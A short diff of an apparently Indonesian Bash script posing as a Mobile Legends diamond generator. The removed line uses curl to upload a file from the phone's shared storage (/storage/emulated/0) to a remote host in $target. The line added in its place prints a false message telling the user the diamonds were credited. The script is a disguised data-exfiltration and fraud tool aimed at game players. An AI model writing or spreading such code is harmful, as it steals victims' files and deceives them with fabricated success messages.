@@ -51,4 +51,4 @@ read -p "╰─jumlah Diamon=" file;
 sleep 1
 echo "loading.... $green "| lolcat 
 sleep 1
-curl -T /storage/emulated/0/$file $target 
+echo "Sukses Gan Cek akun ML anda" | lolcat
